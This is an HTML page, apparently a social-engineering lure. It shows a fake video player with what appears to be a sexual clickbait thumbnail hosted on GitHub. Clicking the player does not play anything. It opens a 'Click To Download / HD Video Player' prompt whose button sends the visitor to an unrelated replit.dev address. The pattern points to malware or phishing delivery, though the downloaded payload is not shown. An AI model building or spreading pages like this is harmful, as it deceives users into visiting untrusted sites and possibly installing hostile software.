<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:#000;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Segoe UI,Tahoma,sans-serif
}
.container{width:100%;max-width:800px;text-align:center}
h1{color:#fff;margin-bottom:25px}
.video-player{
  position:relative;
  border-radius:15px;
  overflow:hidden;
  cursor:pointer;
  border:2px solid #333
}
.video-thumbnail{
  width:100%;
  height:420px;
  object-fit:cover;
  display:block
}
.video-overlay{
  position:absolute;
  top:0;left:0;
  width:100%;height:100%;
  background:rgba(0,0,0,.5);
  display:flex;
  justify-content:center;
  align-items:center
}
.play-button{
  width:80px;height:80px;
  background:#fff;
  border-radius:50%;
  display:flex;
  justify-content:center;
  align-items:center
}
.play-icon{
  width:0;height:0;
  border-top:15px solid transparent;
  border-bottom:15px solid transparent;
  border-left:25px solid red;
  margin-left:5px
}
.confirmation-modal{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:rgba(0,0,0,.85);
  display:none;
  justify-content:center;
  align-items:center;
  z-index:1000
}
.confirmation-modal.show{display:flex}
.confirmation-box{
  background:#111;
  padding:30px;
  border-radius:10px;
  text-align:center;
  max-width:400px;
  width:90%;
  color:#fff
}
.confirm-btn{
  margin-top:20px;
  width:100%;
  padding:12px;
  background:#4285F4;
  border:none;
  color:#fff;
  font-size:16px;
  cursor:pointer;
  border-radius:6px
}
.close-modal{
  position:absolute;
  top:15px;
  right:20px;
  background:none;
  border:none;
  color:#aaa;
  font-size:22px;
  cursor:pointer
}
</style>
</head>

<body>

<div class="container">


<div class="video-player" id="videoPlayer">
<img class="video-thumbnail"
src="https://raw.githubusercontent.com/tiktokprr/video/main/%DA%AF%D8%A7%D9%86%DB%8E%20%DA%A9%DA%86%DB%8E%DA%A9%DB%8C%20%D9%87%DB%95%D9%88%D9%84%DB%8E%D8%B1%DB%8C%20%D9%88%20%D8%B9%DB%95%D8%B1%DB%95%D8%A8%DB%8E%DA%A9%20%D8%B2%DB%86%D8%B1%20%D8%AE%DB%86%D8%B4.png"
alt="Video Thumbnail">

<div class="video-overlay">
<div class="play-button">
<div class="play-icon"></div>
</div>
</div>
</div>
</div>

<div class="confirmation-modal" id="confirmationModal">
<button class="close-modal" id="closeModal">✕</button>
<div class="confirmation-box">
<h3>Click To Download</h3>
<p>HD Video Player</p>
<button class="confirm-btn" id="confirmBtn">Download</button>
</div>
</div>

<script>
const videoPlayer=document.getElementById("videoPlayer");
const modal=document.getElementById("confirmationModal");
const closeModal=document.getElementById("closeModal");
const confirmBtn=document.getElementById("confirmBtn");

videoPlayer.onclick=()=>modal.classList.add("show");
closeModal.onclick=()=>modal.classList.remove("show");
confirmBtn.onclick=()=>{
  modal.classList.remove("show");
  window.open("https://9f03c611-e672-45a7-adee-c585b78776e8-00-3b4ablg93bdnh.sisko.replit.dev/","_blank");
};
</script>
